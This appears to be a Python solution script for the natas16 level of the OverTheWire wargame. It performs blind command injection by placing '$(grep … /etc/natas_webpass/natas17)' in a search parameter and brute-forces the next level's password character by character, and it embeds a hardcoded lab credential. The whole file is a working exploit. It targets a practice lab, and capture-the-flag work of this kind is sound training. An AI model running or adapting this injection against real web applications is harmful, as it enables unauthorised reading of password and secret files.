import requests, string, time

URL = "http://natas16.natas.labs.overthewire.org"
AUTH = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")

characters = string.ascii_letters + string.digits

def finding_valid_characters():
    valid_characters = ""
    for char in characters:
        # Craft the command injection payload
        payload = f"$(grep {char} /etc/natas_webpass/natas17)apples"
        
        # Send the request with the payload
        url = f"{URL}/?needle={payload}&submit=Search"
        response = requests.get(url, auth=AUTH)
        
        # Check if the response indicates a valid character
        if "apples" not in response.text:
            valid_characters += char
            print(f"Found valid character: {char}")
    return valid_characters


def brute_force_password(valid_characters):
    password = ""

    # Passwords are 32 characters long
    while len(password) < 32:
        for char in valid_characters:
            # Craft the command injection payload
            payload = f"$(grep ^{password + char} /etc/natas_webpass/natas17)apples"
            
            # Send the request with the payload
            url = f"{URL}/?needle={payload}&submit=Search"
            response = requests.get(url, auth=AUTH)
            
            # Check if the response indicates a correct guess
            if "apples" not in response.text:
                password += char
                print(f"Current password: {password}")
    
    return password

def main():
    valid_characters = finding_valid_characters()
    print(f"Valid characters: {valid_characters}")
    
    password = brute_force_password(valid_characters)
    print(f"Brute-forced password: {password}")
    
if __name__ == "__main__":
    main()